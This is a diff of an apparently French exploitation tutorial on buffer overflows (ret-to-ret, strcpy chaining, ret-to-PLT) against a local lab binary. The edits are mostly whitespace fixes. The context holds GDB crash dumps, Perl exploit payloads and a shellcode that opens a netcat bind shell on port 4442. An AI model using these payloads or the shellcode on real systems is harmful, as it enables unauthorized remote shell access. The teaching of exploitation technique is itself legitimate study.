@@ -47,7 +47,7 @@ Testons avec GDB, pour voir ce qu'il se passe :
 
 	Program received signal SIGSEGV, Segmentation fault.
 	--------------------------------------------------------------------------[regs]
-	  EAX: 0xBFFFF8F0  EBX: 0xB7FB9000  ECX: 0xBFFFFD30  EDX: 0xBFFFF9FA  o d I t s z a p c 
+	  EAX: 0xBFFFF8F0  EBX: 0xB7FB9000  ECX: 0xBFFFFD30  EDX: 0xBFFFF9FA  o d I t s z a p c
 	  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x41414141  ESP: 0xBFFFFA00  EIP: 0x41414141
 	  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007BError while running hook_stop:
 	Cannot access memory at address 0x41414141
@@ -73,7 +73,7 @@ Notre payload ressemblera à :
 	$ ./a.out `perl -e 'print "\x31\xd2\x52\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x68\x2d\x6c\x76\x70\x89\xe0\x52\x68\x34\x34\x34\x32\x89\xe1\x52\x68\x2d\x76\x76\x65\x89\xe5\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe7\x52\x57\x55\x51\x50\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80" . "A"x197 . "\x96\x83\x04\x08";'`
 	Listening on any address 4442 (saris)
 
- 
+
 ##0x01 Ret to Ret
 
 Utilité : Cette technique peut être utile dans le cas où l'ASLR et/ou PIE est en place, mais où N^X n'est pas activé.
@@ -107,7 +107,7 @@ Jouons la vulnérabilité et examinons la stack au moment du plantage :
 
 	Program received signal SIGSEGV, Segmentation fault.
 	--------------------------------------------------------------------------[regs]
-	  EAX: 0xBFFFF8F0  EBX: 0xB7FB9000  ECX: 0x00000000  EDX: 0x00000000  o d I t s z a p c 
+	  EAX: 0xBFFFF8F0  EBX: 0xB7FB9000  ECX: 0x00000000  EDX: 0x00000000  o d I t s z a p c
 	  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x41414141  ESP: 0xBFFFFA00  EIP: 0x41414141
 	  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007BError while running hook_stop:
 	Cannot access memory at address 0x41414141
@@ -229,7 +229,7 @@ Maintenant, pour chaîner les appels à strcpy afin de copier notre shellcode op
 
 	:::console
 	$ ropc -f ./a.out -g -F | grep pop
-	0x080484ee  -> pop edi ; pop ebp ; ret ; 
+	0x080484ee  -> pop edi ; pop ebp ; ret ;
 
 Un appel à strcpy ressemblera à ça :
 
@@ -378,13 +378,13 @@ L'exploit (en Perl) :
 	$payload .= pack('L', 0x0804803d);
 
 	# Jump on your shellcode !
-	$payload .= pack('L', $bss); 
+	$payload .= pack('L', $bss);
 
 	print $payload;
 
 Testons :
 	:::console
-	$ ./a.out "`perl sploit.pl`" 205                                                                                                       
+	$ ./a.out "`perl sploit.pl`" 205
 	bash-4.2$
 
 ## 0x03 Ret to PLT (read/recv...)
@@ -439,7 +439,7 @@ On a tout ce qu'il faut pour réaliser notre exploit !
 Notre payload ressemblera à :
 
 	:::console
-	[292 | PADDING | recv@plt (saved-eip) | pop3; ret | STDIN | Adresse .bss | shellcode len | Adresse .bss ]
+	[292 | PADDING | read@plt (saved-eip) | pop3; ret | STDIN | Adresse .bss | shellcode len | Adresse .bss ]
 
 Voici l'exploit commenté (en Perl of course) :
 
@@ -469,7 +469,7 @@ Voici l'exploit commenté (en Perl of course) :
 	$payload .= pack('L', 292);
 
 	# Padding
-	$payload .= "A"x268; 
+	$payload .= "A"x268;
 
 	# Read@plt function
 	$payload .= pack('L', $read_plt);
